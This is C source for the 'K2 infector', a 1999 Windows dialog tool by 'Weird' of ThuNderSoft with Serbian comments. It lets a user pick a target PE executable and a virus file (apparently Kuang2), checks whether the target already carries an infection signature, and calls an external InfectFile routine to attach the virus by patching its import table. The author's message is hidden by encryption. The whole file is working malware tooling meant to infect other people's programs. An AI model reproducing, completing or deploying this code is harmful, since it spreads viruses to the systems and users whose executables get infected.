/***[ThuNderSoft]*************************************************************
				INFECTOR: program za inficiranje odreîenog fajla
								   ver: 0.12
								˙˘ƒÕ WEIRD Õƒ˘˙
*****************************************************************************/

/* HISTORY */
// ver 0.12 (18-may-1999): dodata obaveÑtenja o greÑkama
// ver 0.10 (14-may-1999): born code

#include <windows.h>
#include <tools.h>
#include "infector.h"
#pragma aux Wmain "_*"

char* addfile;
extern int IsFileInfect(char *, char*);
extern int InfectFile(char *);
unsigned int i;

extern char kript;
char *signature=&kript+1;

//char eporuka[]=" v1.0   by Weird  <weird173@yahoo.com>";
char eporuka[]={
	0x65, 0xFB, 0xF5, 0x69, 0xF0, 0xFC, 0x95, 0xEA, 0xC3, 0xAE, 0x1F, 0x8D,\
	0x40, 0x68, 0xF7, 0x16, 0x53, 0x53, 0x2E, 0x80, 0x93, 0x7F, 0xE2, 0x3E,\
	0xEF, 0x6A, 0x6B, 0x0F, 0x69, 0x5B, 0xCD, 0x4E, 0x0C, 0x1D, 0xD9, 0x1B,\
	0x4B, 0x26, 0x2A, 0xAC, 0x94, 0x05, 0xF2, 0xA9, 0x85, 0x79, 0x5B, 0x5A};
char coded[]="Coded";

HWND hDlg;
HWND hThisInst;					// handle na program
HICON ikona;

char ffiltar[]="Executables\00*.exe\00All files\00*.*\00";
char fajl[MAX_PATH];
char temp[MAX_PATH];
char ftitle[]="Open file";

OPENFILENAME ofn = {
	sizeof(OPENFILENAME),		// veliÅina ove strukture
	NULL,						// vlasnik (kasnije)
	NULL,
	ffiltar,					// filter linija
	NULL, NULL,					// custom filtars
	1,
	fajl,						// REZULTAT
	MAX_PATH,					// max slova za fajl
	temp, MAX_PATH,
	NULL,						// inicijalni direktorijum
	ftitle,						// Title za Open dijalog
	OFN_FILEMUSTEXIST | OFN_HIDEREADONLY,		// flagovi
	0,							// fajl ofset
	0,							// fajl extenzija ofset
	NULL,						// default extenzija
	0,0,0};

void errorme(char *str)
{
	MessageBox(hDlg, str, "K2 infector", MB_OK | MB_TOPMOST | MB_ICONERROR);
	return;
}

/*
	InfLoop
	--------
  ˛ Obrada poruka za dijalog. */

LRESULT CALLBACK InfLoop (HWND hd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	switch (msg) {

		case WM_INITDIALOG: // inicijalizacija dialoga PRE nego Ñto se dijalog otvori
			hDlg=hd;
			signature[0]=0x4C;
			rdecrypt(eporuka, eporuka);						// dekriptuj eporuku
			for (i=0; i<5; i++) eporuka[i+1]=coded[i];		// dodaj reÅ 'coded'
			SetDlgItemText(hDlg, ID_INFO, &eporuka[1]);		// ispiÑi poruku
			SendDlgItemMessage(hDlg, ID_EDIT1, EM_SETLIMITTEXT, MAX_PATH, 0);	// ograniÅi edit box sadrÇaj
			SendDlgItemMessage(hDlg, ID_EDIT2, EM_SETLIMITTEXT, MAX_PATH, 0);	// ograniÅi edit box sadrÇaj
			ikona=LoadIcon(hThisInst, "AAA");               // uÅitaj ikonu programa
			SendMessage(hDlg, WM_SETICON, ICON_BIG, (LPARAM) ikona);	// setuj ikonu za program
			return TRUE;			// WM_INITDIALOG mora da vrati TRUE

		case WM_SYSCOMMAND:
			if (wParam == SC_CLOSE) {			// pritisnuto 'x' dugme za kraj
				DestroyIcon(ikona);
				EndDialog(hDlg, TRUE);			// zatvori dijalog
				return TRUE; }
			break;

		case WM_COMMAND:
			if (HIWORD(wParam)==BN_CLICKED) {
				switch (LOWORD(wParam)) {
					case ID_BUTTON1:
						fajl[0]=0;
						if (!GetOpenFileName(&ofn)) break;
						SendDlgItemMessage(hDlg, ID_EDIT1, WM_SETTEXT, 0, (LPARAM)fajl);
						break;
					case ID_BUTTON2:
						fajl[0]=0;
						if (!GetOpenFileName(&ofn)) break;
						SendDlgItemMessage(hDlg, ID_EDIT2, WM_SETTEXT, 0, (LPARAM)fajl);
						break;
					case ID_INFECT:
						if (MessageBox(NULL, "This will infect file!\r\n\r\nDo you want to continue?", "K2 infector", MB_YESNO | MB_ICONQUESTION)==IDYES) {
							SendDlgItemMessage(hDlg, ID_EDIT1, WM_GETTEXT, MAX_PATH, (LPARAM)fajl);
							SendDlgItemMessage(hDlg, ID_EDIT2, WM_GETTEXT, MAX_PATH, (LPARAM)temp);

							// prvo proveri da li je fajl zaraÇen
							i=IsFileInfect(fajl, signature);
							if (i==-1) {
								errorme("ERROR: can't determine if file is infected!");
								break;
							}
							if (i==1) {
								errorme("ERROR: file is already infected!");
								break;
							}

							// nije zaraÇen - zarazi ga:)
							addfile=temp;
							switch (InfectFile(fajl)){
								case 0x10:
									errorme("ERROR: can't open the file.");
									break;
								case 0x11:
									errorme("ERROR: invalid file size.");
									break;
								case 0x12:
									errorme("ERROR: can't create file mapping.");
									break;
								case 0x13:
									errorme("ERROR: can't MapView file.");
									break;
								case 0x101:
									errorme("ERROR: file is not a executable.");
									break;
								case 0x102:
									errorme("ERROR: file is not Windows PE EXE.");
									break;
								case 0x103:
									errorme("ERROR: file is not for GUI.");
									break;
								case 0x105:
									errorme("ERROR: can't find IMPORT section.");
									break;
								case 0x106:
									errorme("ERROR: can't find IMPORT table.");
									break;
								case 0x108:
									errorme("ERROR: can't find GetModuleHandle KERNEL32 import.");
									break;
								case 0x10A:
									errorme("ERROR: can't open virus file.");
									break;
								case 0:
									MessageBox(hd, "File infected OK!", "K2 infector", MB_OK | MB_ICONASTERISK);
									break;
							}
						}
						break;

				}
				return TRUE;
			}
			break;
	}

	return FALSE;
}


/*
	WinMain
	--------
  ˛ Inficira odreîeni fajl!
  ˛ parametri su: <ime_fajla_za_inficiranje> <ime_kuang2_fajla> */

int Wmain()
{
	char *CmdLine;

	// inicijalizacija
	hThisInst=GetModuleHandle(NULL);	// preuzmi handle ove aplikacije
	CmdLine=GetCommandLine();			// preuzmi komandnu liniju

	// startuj
	DialogBox (hThisInst, "ID_DIALOG", NULL, (DLGPROC) InfLoop);
	return 0;
}
